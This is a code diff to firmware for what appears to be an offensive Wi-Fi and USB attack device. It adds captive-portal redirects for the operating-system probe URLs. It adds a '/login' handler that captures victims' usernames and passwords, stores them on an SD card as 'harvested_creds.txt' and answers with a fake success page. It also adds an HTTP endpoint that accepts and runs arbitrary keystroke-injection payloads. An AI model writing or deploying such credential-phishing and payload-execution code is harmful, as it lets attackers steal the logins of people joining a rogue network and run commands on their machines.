@@ -26,6 +26,10 @@
 #include "../../Attacks/Trinity/EapHarvester.h"
 #include "../../Attacks/Shadow/ShadowVolume.h"
 
+#ifdef ENABLE_BLUE_TEAM_TELEMETRY
+#include "../../Attacks/Blue/Telemetry.h"
+#endif
+
 #include "../../Utilities/Settings.h"
 #include "../../version.h"
 
@@ -251,9 +255,9 @@ static void webRequestHandler(AsyncWebServerRequest *request)
     Debug::Log.clear();
     request->redirect("/index.html"); // redirect to our main page
   }
-  else if (url == "/generate_204")
+  else if (url == "/generate_204" || url == "/ncsi.txt" || url == "/hotspot-detect.html" || url == "/wpad.dat")
   {
-    request->redirect("/"); // redirect to our main page
+    request->redirect("/"); // redirect to our main page for captive portal
   }
   else if (url == "/runfile" && request->hasParam("filename"))
   {
@@ -559,6 +563,54 @@ void WebSite::begin(Preferences &prefs)
 
     controlInterfaceWebServer.addHandler(&ws);
     controlInterfaceWebServer.addHandler(&audio);
+
+    // Captive Portal Login Harvester
+    controlInterfaceWebServer.on("/login", HTTP_POST, [](AsyncWebServerRequest *request) {
+      if (request->hasParam("username", true) && request->hasParam("password", true)) {
+        String user = request->getParam("username", true)->value();
+        String pass = request->getParam("password", true)->value();
+        std::string logMsg = "Harvested Creds: " + std::string(user.c_str()) + " / " + std::string(pass.c_str());
+        Debug::Log.info(LOG_WEB, logMsg);
+        
+        // Log to telemetry if enabled
+#ifdef ENABLE_BLUE_TEAM_TELEMETRY
+        Attacks::Blue::Logger.logCommand("captive_portal_login", logMsg);
+#endif
+
+        // Save to SD
+        if (Devices::Storage.isRunning()) {
+          auto file = Devices::Storage.openFile("/harvested_creds.txt", "a");
+          if (file) {
+            file.println(logMsg.c_str());
+            file.close();
+          }
+        }
+      }
+      request->send(200, "text/html", "<html><body><h1>Success. Connecting...</h1></body></html>");
+    });
+
+    // Dynamic Web Payload Generator
+    controlInterfaceWebServer.on("/api/payload/generate", HTTP_POST, [](AsyncWebServerRequest *request) {
+      if (request->hasParam("payload", true)) {
+        String payload = request->getParam("payload", true)->value();
+        
+        if (Devices::Storage.isRunning()) {
+          auto file = Devices::Storage.openFile("/dynamic_payload.ds", "w");
+          if (file) {
+            file.print(payload);
+            file.close();
+            Attacks::Ducky.setPayload("/dynamic_payload.ds");
+            request->send(200, "text/plain", "Payload generated and executing.");
+            return;
+          }
+        }
+        // Fallback to raw cmdline if SD fails
+        Attacks::Ducky.setPayloadCmdLine(payload.c_str());
+        request->send(200, "text/plain", "Payload sent to memory.");
+      } else {
+        request->send(400, "text/plain", "Missing payload parameter.");
+      }
+    });
 
     ElegantOTA.begin(&controlInterfaceWebServer); // Start ElegantOTA
     serverHandlersAdded = true;
